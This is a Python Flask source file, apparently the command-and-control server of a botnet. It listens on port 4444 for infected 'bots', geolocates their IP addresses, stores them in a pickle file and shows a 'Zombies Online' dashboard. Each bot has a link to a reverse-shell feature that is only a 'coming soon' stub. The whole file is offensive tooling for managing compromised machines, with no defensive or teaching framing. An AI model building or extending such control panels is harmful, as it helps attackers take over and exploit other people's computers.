import socket
import threading
import pickle
import time
import platform
import os
from flask import Flask, render_template_string, request, redirect, url_for
import geocoder

app = Flask(__name__)
HOST = '0.0.0.0'
SOCKET_PORT = 4444
PICKLE_FILE = 'bots.pkl'
bots = {}

# HTML TEMPLATE (vše v jednom)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Zombies Online</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: #eee; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #444; text-align: left; }
        th { background-color: #222; }
        .online { color: lime; }
        .offline { color: red; }
        a { color: deepskyblue; text-decoration: none; }
    </style>
</head>
<body>
    <h1>Zombies Online: {{ online_count }}</h1>
    <table>
        <tr>
            <th>ID</th><th>Status</th><th>IP</th><th>OS</th><th>Shell</th><th>Country</th>
        </tr>
        {% for bot_id, info in bots.items() %}
        <tr>
            <td>{{ bot_id }}</td>
            <td class="{{ 'online' if info['status'] == 'Online' else 'offline' }}">{{ info['status'] }}</td>
            <td>{{ info['ip'] }}</td>
            <td>{{ info['os'] }}</td>
            <td><a href="/shell-id={{ bot_id }}">🕹️</a></td>
            <td>{{ info['country'] }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

def save_bots():
    with open(PICKLE_FILE, 'wb') as f:
        pickle.dump(bots, f)

def load_bots():
    global bots
    if os.path.exists(PICKLE_FILE):
        with open(PICKLE_FILE, 'rb') as f:
            bots = pickle.load(f)

def update_bot(ip, os_name):
    g = geocoder.ip(ip)
    country = g.country or "Unknown"
    for bot_id, info in bots.items():
        if info['ip'] == ip:
            bots[bot_id].update({
                'status': 'Online',
                'last_seen': time.time(),
                'os': os_name,
                'country': country
            })
            save_bots()
            return bot_id
    # New bot
    bot_id = str(len(bots) + 1)
    bots[bot_id] = {
        'ip': ip,
        'status': 'Online',
        'last_seen': time.time(),
        'os': os_name,
        'country': country
    }
    save_bots()
    return bot_id

def socket_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, SOCKET_PORT))
    s.listen(5)
    print(f"[+] Socket server listening on {HOST}:{SOCKET_PORT}")
    while True:
        conn, addr = s.accept()
        ip = addr[0]
        try:
            os_name = conn.recv(1024).decode()
            bot_id = update_bot(ip, os_name)
            print(f"[+] Bot {bot_id} ({ip}) connected")
        except:
            pass
        conn.close()

def cleanup_loop():
    while True:
        now = time.time()
        for bot_id in list(bots):
            last = bots[bot_id]['last_seen']
            if now - last > 15:
                bots[bot_id]['status'] = 'Offline'
        save_bots()
        time.sleep(5)

@app.route('/')
def dashboard():
    online_count = sum(1 for b in bots.values() if b['status'] == 'Online')
    return render_template_string(HTML_TEMPLATE, bots=bots, online_count=online_count)

@app.route('/shell-id=<bot_id>')
def shell(bot_id):
    return f"Reverse Shell for Bot {bot_id} – comming soon..."

@app.route('/session')
def session():
    return dashboard()

if __name__ == '__main__':
    load_bots()
    threading.Thread(target=socket_listener, daemon=True).start()
    threading.Thread(target=cleanup_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=80)
